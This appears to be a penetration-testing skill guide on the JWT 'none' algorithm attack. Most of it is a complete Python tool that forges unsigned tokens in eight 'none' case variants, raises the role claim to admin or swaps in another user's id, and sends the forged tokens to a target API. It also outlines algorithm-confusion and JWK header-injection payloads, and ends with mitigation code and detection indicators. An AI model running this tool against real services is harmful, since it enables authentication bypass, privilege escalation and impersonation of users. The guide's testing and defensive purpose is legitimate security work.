---
name: performing-jwt-none-algorithm-attack
description: Execute and test the JWT none algorithm attack to bypass signature verification by manipulating the alg header field in JSON Web Tokens.
domain: cybersecurity
subdomain: api-security
tags: [jwt, none-algorithm, authentication-bypass, token-manipulation, signature-bypass, penetration-testing, owasp, web-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing JWT None Algorithm Attack

## Overview

The JWT none algorithm attack exploits a vulnerability in JSON Web Token libraries that accept tokens with the `alg` header set to `none`, effectively bypassing signature verification. When a server processes a JWT with `"alg": "none"`, it treats the token as valid without checking any cryptographic signature, allowing attackers to forge tokens with arbitrary claims such as escalated privileges, impersonated users, or extended expiration times. This vulnerability was first disclosed by Tim McLean in 2015 and has affected multiple JWT libraries across languages.

## Prerequisites

- Target application using JWT for authentication or authorization
- Ability to intercept and modify HTTP requests (Burp Suite, mitmproxy)
- Python 3.8+ with PyJWT library for token crafting
- Understanding of JWT structure (Header.Payload.Signature)
- Authorization to perform security testing on the target

## JWT Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    # Header
eyJzdWIiOiIxMjM0IiwibmFtZSI6IkpvaG4ifQ.    # Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  # Signature
```

## Attack Methodology

### Step 1: Capture a Valid JWT

Intercept a legitimate JWT from the target application using Burp Suite or browser developer tools:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Step 2: Decode and Analyze the Token

```python
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

parts = token.split('.')

# Decode header
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
print(f"Header: {header}")
# Output: {'alg': 'HS256', 'typ': 'JWT'}

# Decode payload
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print(f"Payload: {payload}")
# Output: {'sub': '1234567890', 'name': 'John Doe', 'role': 'user', 'iat': 1516239022}
```

### Step 3: Craft a Forged Token with None Algorithm

```python
#!/usr/bin/env python3
"""JWT None Algorithm Attack Tool

Crafts JWT tokens with the 'none' algorithm to test for
signature verification bypass vulnerabilities.
"""

import base64
import json
import requests
import sys
from typing import Optional

class JWTNoneAttack:
    # All known variations of the 'none' algorithm value
    NONE_VARIANTS = [
        "none",
        "None",
        "NONE",
        "nOnE",
        "noNe",
        "NoNe",
        "nONE",
        "nonE",
    ]

    def __init__(self, target_url: str, original_token: str):
        self.target_url = target_url
        self.original_token = original_token
        self.original_header, self.original_payload = self._decode_token(original_token)

    def _base64url_encode(self, data: bytes) -> str:
        """Base64URL encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    def _base64url_decode(self, data: str) -> bytes:
        """Base64URL decode with padding restoration."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def _decode_token(self, token: str) -> tuple:
        """Decode JWT header and payload."""
        parts = token.split('.')
        header = json.loads(self._base64url_decode(parts[0]))
        payload = json.loads(self._base64url_decode(parts[1]))
        return header, payload

    def craft_none_token(self, modified_payload: dict,
                          alg_variant: str = "none") -> str:
        """Craft a JWT with the none algorithm and modified payload."""
        # Create header with none algorithm
        header = {"alg": alg_variant, "typ": "JWT"}
        header_encoded = self._base64url_encode(json.dumps(header).encode())

        # Encode modified payload
        payload_encoded = self._base64url_encode(json.dumps(modified_payload).encode())

        # Token with empty signature (just trailing dot)
        return f"{header_encoded}.{payload_encoded}."

    def craft_privilege_escalation(self, role_field: str = "role",
                                     admin_value: str = "admin") -> list:
        """Create tokens with escalated privileges using all none variants."""
        tokens = []
        modified_payload = dict(self.original_payload)
        modified_payload[role_field] = admin_value

        for variant in self.NONE_VARIANTS:
            token = self.craft_none_token(modified_payload, variant)
            tokens.append({"variant": variant, "token": token})

        return tokens

    def craft_user_impersonation(self, target_user_id: str,
                                   user_field: str = "sub") -> str:
        """Create a token impersonating another user."""
        modified_payload = dict(self.original_payload)
        modified_payload[user_field] = target_user_id
        return self.craft_none_token(modified_payload)

    def test_none_variants(self, endpoint: str = "/api/profile",
                            headers: Optional[dict] = None) -> list:
        """Test all none algorithm variants against the target."""
        results = []
        base_headers = headers or {}

        for variant in self.NONE_VARIANTS:
            modified_payload = dict(self.original_payload)
            modified_payload["role"] = "admin"
            token = self.craft_none_token(modified_payload, variant)

            test_headers = dict(base_headers)
            test_headers["Authorization"] = f"Bearer {token}"

            try:
                response = requests.get(
                    f"{self.target_url}{endpoint}",
                    headers=test_headers,
                    timeout=10
                )
                result = {
                    "variant": variant,
                    "status_code": response.status_code,
                    "accepted": response.status_code == 200,
                    "response_length": len(response.content),
                }
                results.append(result)

                if response.status_code == 200:
                    print(f"  [VULNERABLE] alg='{variant}' -> {response.status_code}")
                else:
                    print(f"  [SAFE] alg='{variant}' -> {response.status_code}")

            except requests.exceptions.RequestException as e:
                results.append({
                    "variant": variant,
                    "status_code": 0,
                    "accepted": False,
                    "error": str(e)
                })

        return results

    def test_empty_signature_variants(self) -> list:
        """Test different empty signature formats."""
        modified_payload = dict(self.original_payload)
        modified_payload["role"] = "admin"
        header = {"alg": "none", "typ": "JWT"}

        header_encoded = self._base64url_encode(json.dumps(header).encode())
        payload_encoded = self._base64url_encode(json.dumps(modified_payload).encode())

        # Different signature formats
        variants = [
            f"{header_encoded}.{payload_encoded}.",      # Empty signature with trailing dot
            f"{header_encoded}.{payload_encoded}",       # No trailing dot
            f"{header_encoded}.{payload_encoded}.AA==",  # Minimal base64 signature
        ]

        results = []
        for token in variants:
            results.append({"token_format": token[-20:], "token": token})

        return results


def main():
    if len(sys.argv) < 3:
        print("Usage: python jwt_none_attack.py <target_url> <original_token>")
        print("Example: python jwt_none_attack.py https://api.example.com eyJhbG...")
        sys.exit(1)

    target_url = sys.argv[1]
    original_token = sys.argv[2]

    attacker = JWTNoneAttack(target_url, original_token)

    print(f"\nOriginal Token Header: {attacker.original_header}")
    print(f"Original Token Payload: {attacker.original_payload}")

    print(f"\n{'='*60}")
    print("Testing None Algorithm Variants")
    print(f"{'='*60}")
    results = attacker.test_none_variants()

    vulnerable = [r for r in results if r.get("accepted")]
    if vulnerable:
        print(f"\n[!] VULNERABLE: {len(vulnerable)} variant(s) accepted!")
        print("[!] The server does not properly validate JWT signatures")
    else:
        print(f"\n[+] SECURE: All none algorithm variants were rejected")


if __name__ == "__main__":
    main()
```

### Step 4: Additional JWT Attack Variants

**Algorithm Confusion (RS256 to HS256):**
If the server uses RS256 (asymmetric), an attacker who knows the public key can:
1. Change `alg` to `HS256`
2. Sign the token using the public key as the HMAC secret
3. The server may verify the signature using its public key as an HMAC key

**JWK Header Injection (CVE-2018-0114):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker-controlled-key>",
    "e": "AQAB"
  }
}
```

## Mitigation Strategies

```python
# Secure JWT verification - always specify allowed algorithms
import jwt

def verify_token_secure(token: str, secret_key: str) -> dict:
    """Verify JWT with explicit algorithm allowlist."""
    try:
        payload = jwt.decode(
            token,
            secret_key,
            algorithms=["HS256"],  # CRITICAL: Explicit allowlist
            options={
                "require": ["exp", "iat", "sub"],  # Required claims
                "verify_exp": True,
                "verify_iat": True,
            }
        )
        return payload
    except jwt.InvalidAlgorithmError:
        raise ValueError("Invalid token algorithm")
    except jwt.ExpiredSignatureError:
        raise ValueError("Token expired")
    except jwt.InvalidTokenError:
        raise ValueError("Invalid token")
```

## Detection Indicators

- JWT tokens with `"alg": "none"` (or case variations) in server logs
- Tokens with empty or missing signature segments
- Sudden change in algorithm field from normal patterns
- Tokens with modified claims (role escalation) from the same session
- Authorization header containing tokens with only two Base64 segments

## References

- OWASP JWT Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
- Auth0 JWT Vulnerability Disclosure: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- PortSwigger JWT None Algorithm: https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported
- HackTricks JWT Vulnerabilities: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- Invicti JWT Signature Bypass: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/jwt-signature-bypass-via-none-algorithm
